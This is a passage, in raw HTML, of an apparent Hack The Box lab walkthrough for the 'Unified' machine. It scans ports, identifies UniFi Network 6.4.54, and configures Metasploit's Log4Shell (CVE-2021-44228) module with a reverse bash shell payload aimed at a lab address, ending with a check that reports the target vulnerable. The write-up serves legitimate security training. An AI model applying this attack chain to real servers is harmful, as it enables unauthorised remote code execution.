+</span></span></span><span class=line><span class=cl><span class=s2>SF:background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-si
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ze:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;border
+</span></span></span><span class=line><span class=cl><span class=s2>SF::none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20404\x20\xe2\x80\x93\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20Not\x20Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>Socks5,24E,<span class=s2>&#34;HTTP/1\.1\x20400\x20\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\nContent-Length:\x20435\r\nDate:\x20Sun,\x2021\x20May\x202023\x2017:1
+</span></span></span><span class=line><span class=cl><span class=s2>SF:8:25\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20l
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0Request&lt;/title&gt;&lt;style\x20type=\&#34;text/css\&#34;&gt;body\x20{font-family:Tahoma
+</span></span></span><span class=line><span class=cl><span class=s2>SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
+</span></span></span><span class=line><span class=cl><span class=s2>SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}&lt;/
+</span></span></span><span class=line><span class=cl><span class=s2>SF:style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 173.59 seconds
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
+</span></span></code></pre></div><p><strong>Four</strong> top-ports are reported <strong>open</strong>: ports 22, 6789, 8080 and 8443.</p><p>Based on this <strong>information</strong>, there are a couple of <strong>assumptions</strong> one might make:</p><ul><li>port 22 &ndash;> version: openssh (1:8.2p1-4ubuntu0.3)</li><li>port 6789 &ndash;> ibm-db2-admin? (maybe an IMB database??)</li><li>port 8080 &ndash;> http proxy -> automatic redirect to - <em>https://$rhost:8443/manage</em> -</li><li>port 8443 &ndash;> looks like Nagios NSCA</li><li>target os &ndash;> probably Ubuntu 20.04.6 LTS (Focal Fossa)</li></ul><p>Another interesting piece of information is the <strong>fingerprinting result</strong> which we get for the <strong>web server</strong> that our <strong>target</strong> is hosting.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ whatweb <span class=nv>$rhost</span>:8080
+</span></span><span class=line><span class=cl>http://10.129.157.249:8080 <span class=o>[</span><span class=m>302</span> Found<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, IP<span class=o>[</span>10.129.157.249<span class=o>]</span>, RedirectLocation<span class=o>[</span>/manage<span class=o>]</span>
+</span></span><span class=line><span class=cl>http://10.129.157.249:8080/manage <span class=o>[</span><span class=m>302</span> Found<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, IP<span class=o>[</span>10.129.157.249<span class=o>]</span>, RedirectLocation<span class=o>[</span>https://10.129.157.249:8443/manage<span class=o>]</span>
+</span></span><span class=line><span class=cl>https://10.129.157.249:8443/manage <span class=o>[</span><span class=m>302</span> Found<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, IP<span class=o>[</span>10.129.157.249<span class=o>]</span>, RedirectLocation<span class=o>[</span>/manage/account/login?redirect<span class=o>=</span>%2Fmanage<span class=o>]</span>
+</span></span><span class=line><span class=cl>https://10.129.157.249:8443/manage/account/login?redirect<span class=o>=</span>%2Fmanage <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, IP<span class=o>[</span>10.129.157.249<span class=o>]</span>, Script, Title<span class=o>[</span>UniFi Network<span class=o>]</span>, X-Frame-Options<span class=o>[</span>SAMEORIGIN<span class=o>]</span>
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
+</span></span></code></pre></div><p>Accessing the <strong>web server</strong> on port 8080 triggers multiple <strong>automatic redirections</strong> in the following order:</p><ul><li>1 - <em>https://$rhost:8080/</em> - on port 8080</li><li>2 - <em>https://$rhost:8080/manage</em> - on port 8080</li><li>3 - <em>https://$rhost:8443/manage</em> - on port 8443</li><li>4 - <em>https://$rhost:8443/manage</em> - on port 8443</li><li>5 - <em>https://$rhost:8443/manage/account/login?redirect=%2Fmanage</em> - on port 8443</li></ul><p>It looks like an automatic redirect to a <strong>login page</strong>. It&rsquo;s time to check it out.</p><blockquote><p>22,6789,8080,8443</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>What is the title of the software that is running running on port 8443?</em></p><p>Using our <strong>browser</strong> to <strong>access</strong> it (web page from TASK1), we are first warned of <strong>potential security risks</strong> and only after explicitly <strong>allowing it</strong> do we land on the <strong>login page</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/unified/website-login.png alt=website-login title=website-login></p><p>The answer for this task lies in the <strong>http-title</strong> belonging to the website that is served on port 8443. Optionally, taking an other look at the <em><strong>nmap</strong></em> report from TASK1 would also get us the answer.</p><blockquote><p>unifi network</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the version of the software that is running?</em></p><p>The answer for this TASK is simply <strong>displayed</strong> on the <strong>login page</strong> (see TASK2).</p><blockquote><p>6.4.54</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>What is the CVE for the identified vulnerability?</em></p><p>There are many ways to <strong>search</strong> for the aforementioned <strong>CVE</strong>. One of them is to use the <em><strong>searchsploit</strong></em> tool that searches the <strong>exploitdb</strong> database for any mentions.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ searchsploit unifi network
+</span></span><span class=line><span class=cl>------------------------------------------------------------ ---------------------------------
+</span></span><span class=line><span class=cl> Exploit Title                                              <span class=p>|</span>  Path
+</span></span><span class=line><span class=cl>------------------------------------------------------------ ---------------------------------
+</span></span><span class=line><span class=cl>Ubiquiti Networks UniFi 3.2.10 - Cross-Site Request Forgery <span class=p>|</span> json/webapps/39488.txt
+</span></span><span class=line><span class=cl>Ubiquiti Networks UniFi Video Default - <span class=s1>&#39;crossdomain.xml&#39;</span> S <span class=p>|</span> php/webapps/39268.java
+</span></span><span class=line><span class=cl>------------------------------------------------------------ ---------------------------------
+</span></span><span class=line><span class=cl>Shellcodes: No Results
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
+</span></span></code></pre></div><p>Sadly, none of the results look very promising. Therefore, we keep on looking&mldr;</p><p>Another <strong>search option</strong> is to simply use an <strong>internet</strong> search engine. But for the sake of variety, we&rsquo;ll be using the <em><strong>metasploit framework</strong></em> <strong>search</strong> feature here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ msfconsole -q
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; search unifi network
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
+</span></span><span class=line><span class=cl><span class=o>================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                                   Disclosure Date  Rank       Check  Description</span>
+</span></span><span class=line><span class=cl>   -  ----                                                   ---------------  ----       -----  -----------
+</span></span><span class=line><span class=cl>   <span class=m>0</span>  exploit/multi/misc/jboss_remoting_unified_invoker_rce  2019-12-11       excellent  Yes    JBOSS EAP/AS Remoting Unified Invoker RCE
+</span></span><span class=line><span class=cl>   <span class=m>1</span>  auxiliary/admin/networking/ubiquiti_config                              normal     No     Ubiquiti Configuration Importer
+</span></span><span class=line><span class=cl>   <span class=m>2</span>  exploit/multi/http/ubiquiti_unifi_log4shell            2021-12-09       excellent  Yes    UniFi Network Application Unauthenticated JNDI Injection RCE <span class=o>(</span>via Log4Shell<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 2, use <span class=m>2</span> or use exploit/multi/http/ubiquiti_unifi_log4shell
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; info <span class=m>2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       Name: UniFi Network Application Unauthenticated JNDI Injection RCE <span class=o>(</span>via Log4Shell<span class=o>)</span>
+</span></span><span class=line><span class=cl>     Module: exploit/multi/http/ubiquiti_unifi_log4shell
+</span></span><span class=line><span class=cl>   Platform: 
+</span></span><span class=line><span class=cl>       Arch: 
+</span></span><span class=line><span class=cl> Privileged: No
+</span></span><span class=line><span class=cl>    License: Metasploit Framework License <span class=o>(</span>BSD<span class=o>)</span>
+</span></span><span class=line><span class=cl>       Rank: Excellent
+</span></span><span class=line><span class=cl>  Disclosed: 2021-12-09
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Provided by:
+</span></span><span class=line><span class=cl>  Spencer McIntyre
+</span></span><span class=line><span class=cl>  RageLtMan &lt;rageltman@sempervictus&gt;
+</span></span><span class=line><span class=cl>  Nicholas Anastasi
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module side effects:
+</span></span><span class=line><span class=cl> ioc-in-logs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module stability:
+</span></span><span class=line><span class=cl> crash-safe
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module reliability:
+</span></span><span class=line><span class=cl> repeatable-session
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Available targets:
+</span></span><span class=line><span class=cl>      Id  Name
+</span></span><span class=line><span class=cl>      --  ----
+</span></span><span class=line><span class=cl>      <span class=m>0</span>   <span class=nv>Windows</span>
+</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt;  <span class=m>1</span>   Unix
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Check supported:
+</span></span><span class=line><span class=cl>  Yes
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Basic options:
+</span></span><span class=line><span class=cl>  Name       Current Setting  Required  Description
+</span></span><span class=line><span class=cl>  ----       ---------------  --------  -----------
+</span></span><span class=line><span class=cl>  LDIF_FILE                   no        Directory LDIF file path
+</span></span><span class=line><span class=cl>  Proxies                     no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:po
+</span></span><span class=line><span class=cl>                                        rt<span class=o>][</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>  RHOSTS                      yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com/
+</span></span><span class=line><span class=cl>                                        docs/using-metasploit/basics/using-metasploit.html
+</span></span><span class=line><span class=cl>  RPORT      <span class=m>8443</span>             yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
+</span></span><span class=line><span class=cl>  SRVHOST    0.0.0.0          yes       The <span class=nb>local</span> host or network interface to listen on. Th
+</span></span><span class=line><span class=cl>                                        is must be an address on the <span class=nb>local</span> machine or 0.0.0.
+</span></span><span class=line><span class=cl>                                        <span class=m>0</span> to listen on all addresses.
+</span></span><span class=line><span class=cl>  SRVPORT    <span class=m>389</span>              yes       The <span class=nb>local</span> port to listen on.
+</span></span><span class=line><span class=cl>  SSL        <span class=nb>true</span>             no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
+</span></span><span class=line><span class=cl>  TARGETURI  /                yes       Base path
+</span></span><span class=line><span class=cl>  VHOST                       no        HTTP server virtual host
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload information:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Description:
+</span></span><span class=line><span class=cl>  The Ubiquiti UniFi Network Application versions 5.13.29 through 
+</span></span><span class=line><span class=cl>  6.5.53 are affected by the Log4Shell vulnerability whereby a JNDI 
+</span></span><span class=line><span class=cl>  string can be sent to the server via the <span class=s1>&#39;remember&#39;</span> field of a POST 
+</span></span><span class=line><span class=cl>  request to the /api/login endpoint that will cause the server to 
+</span></span><span class=line><span class=cl>  connect to the attacker and deserialize a malicious Java object. 
+</span></span><span class=line><span class=cl>  This results in OS <span class=nb>command</span> execution in the context of the server 
+</span></span><span class=line><span class=cl>  application. This module will start an LDAP server that the target 
+</span></span><span class=line><span class=cl>  will need to connect to.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>References:
+</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+</span></span><span class=line><span class=cl>  https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
+</span></span><span class=line><span class=cl>  https://github.com/puzzlepeaches/Log4jUnifi
+</span></span><span class=line><span class=cl>  https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Also known as:
+</span></span><span class=line><span class=cl>  Log4Shell
+</span></span><span class=line><span class=cl>  LogJam
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>View the full module info with the info -d command.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><p>It&rsquo;s <strong>exactly</strong> what we have been looking for, so we <strong>select it</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; use <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload cmd/unix/reverse_bash
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; 
+</span></span></code></pre></div><blockquote><p>cve-2021-44228</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What protocol does JNDI leverage in the injection?</em></p><p>One nice summary we may find is on the <a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-44228&amp;scoretype=cvssv3" title="vulmon website">vulmon website</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Vulnerability Summary
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>Apache Log4j2 2.0-beta9 up to and including 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></div><blockquote><p>ldap</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What tool do we use to intercept the traffic, indicating the attack was successful?</em></p><p>Even though the question is a bit misleading (for those not following the official write-up), there are many tools we could use. <em><strong>Wireshark</strong></em> and <em><strong>tcpdump</strong></em> are only one of the most popular ones.</p><p>Nevertheless, the <strong>exploit</strong> (<em>exploit/multi/http/ubiquiti_unifi_log4shell</em>) we found in TASK4 should take care of this automatically. So in our case, the <strong>metasploit framework</strong> would do the interception. (<em>This is why we might need to run msf with sudo - sudo msfconsole -q -, since binding any port below 1000 requires root permissions on linux.</em>)</p><blockquote><p>tcpdump</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What port do we need to inspect intercepted traffic for?</em></p><p>There is a <strong>very nice</strong> <a href=https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi title=article>article</a> describing the <strong>ins and outs</strong> of the aforementioned vulnerability on <strong>Unifi</strong>.</p><p>Alternatively, listing the <strong>exploit options</strong> in the <strong>metasploit framework</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; show options
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/multi/http/ubiquiti_unifi_log4shell<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name       Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----       ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   LDIF_FILE                   no        Directory LDIF file path
+</span></span><span class=line><span class=cl>   Proxies                     no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:p
+</span></span><span class=line><span class=cl>                                         ort<span class=o>][</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>   RHOSTS                      yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com
+</span></span><span class=line><span class=cl>                                         /docs/using-metasploit/basics/using-metasploit.html
+</span></span><span class=line><span class=cl>   RPORT      <span class=m>8443</span>             yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
+</span></span><span class=line><span class=cl>   SRVHOST    0.0.0.0          yes       The <span class=nb>local</span> host or network interface to listen on. T
+</span></span><span class=line><span class=cl>                                         his must be an address on the <span class=nb>local</span> machine or 0.0.
+</span></span><span class=line><span class=cl>                                         0.0 to listen on all addresses.
+</span></span><span class=line><span class=cl>   SRVPORT    <span class=m>389</span>              yes       The <span class=nb>local</span> port to listen on.
+</span></span><span class=line><span class=cl>   SSL        <span class=nb>true</span>             no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
+</span></span><span class=line><span class=cl>   TARGETURI  /                yes       Base path
+</span></span><span class=line><span class=cl>   VHOST                       no        HTTP server virtual host
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>cmd/unix/reverse_bash<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name   Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----   ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   LHOST                   yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT  <span class=m>4444</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>1</span>   Unix
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><p>should also shine some light on the answer (<strong>srvport</strong> is set to <strong>port 389</strong> as default).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>SRVPORT    389              yes       The local port to listen on.
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></div><blockquote><p>389</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>What port is the MongoDB service running on?</em></p><p>In order to run our exploit, first we&rsquo;ll need to <strong>adjust</strong> some of it&rsquo;s <strong>settings</strong>. (rhost/s is set to $rhost)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; <span class=nb>set</span> rhosts 10.129.157.249
+</span></span><span class=line><span class=cl><span class=nv>rhosts</span> <span class=o>=</span>&gt; 10.129.157.249
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; <span class=nb>set</span> srvhost tun0
+</span></span><span class=line><span class=cl><span class=nv>srvhost</span> <span class=o>=</span>&gt; 10.10.14.41
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; <span class=nb>set</span> lhost tun0
+</span></span><span class=line><span class=cl><span class=nv>lhost</span> <span class=o>=</span>&gt; 10.10.14.41
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><p><strong>Modifying</strong> them should result in the following <strong>configuration</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; show options
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/multi/http/ubiquiti_unifi_log4shell<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name       Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----       ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   LDIF_FILE                   no        Directory LDIF file path
+</span></span><span class=line><span class=cl>   Proxies                     no        A proxy chain of format type:host:port<span class=o>[</span>,type:host:p
+</span></span><span class=line><span class=cl>                                         ort<span class=o>][</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>   RHOSTS     10.129.157.249   yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com
+</span></span><span class=line><span class=cl>                                         /docs/using-metasploit/basics/using-metasploit.html
+</span></span><span class=line><span class=cl>   RPORT      <span class=m>8443</span>             yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
+</span></span><span class=line><span class=cl>   SRVHOST    10.10.14.41      yes       The <span class=nb>local</span> host or network interface to listen on. T
+</span></span><span class=line><span class=cl>                                         his must be an address on the <span class=nb>local</span> machine or 0.0.
+</span></span><span class=line><span class=cl>                                         0.0 to listen on all addresses.
+</span></span><span class=line><span class=cl>   SRVPORT    <span class=m>389</span>              yes       The <span class=nb>local</span> port to listen on.
+</span></span><span class=line><span class=cl>   SSL        <span class=nb>true</span>             no        Negotiate SSL/TLS <span class=k>for</span> outgoing connections
+</span></span><span class=line><span class=cl>   TARGETURI  /                yes       Base path
+</span></span><span class=line><span class=cl>   VHOST                       no        HTTP server virtual host
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>cmd/unix/reverse_bash<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name   Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----   ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   LHOST  10.10.14.41      yes       The listen address <span class=o>(</span>an interface may be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT  <span class=m>4444</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Id  Name
+</span></span><span class=line><span class=cl>   --  ----
+</span></span><span class=line><span class=cl>   <span class=m>1</span>   Unix
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>View the full module info with the info, or info -d command.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt;
+</span></span></code></pre></div><p>Once <strong>properly</strong> configured, we can <strong>check</strong> if our target is vulnerable or not.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt; check
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.129.157.249:8443 - The target is vulnerable.
+</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/http/ubiquiti_unifi_log4shell<span class=o>)</span> &gt;&gt;
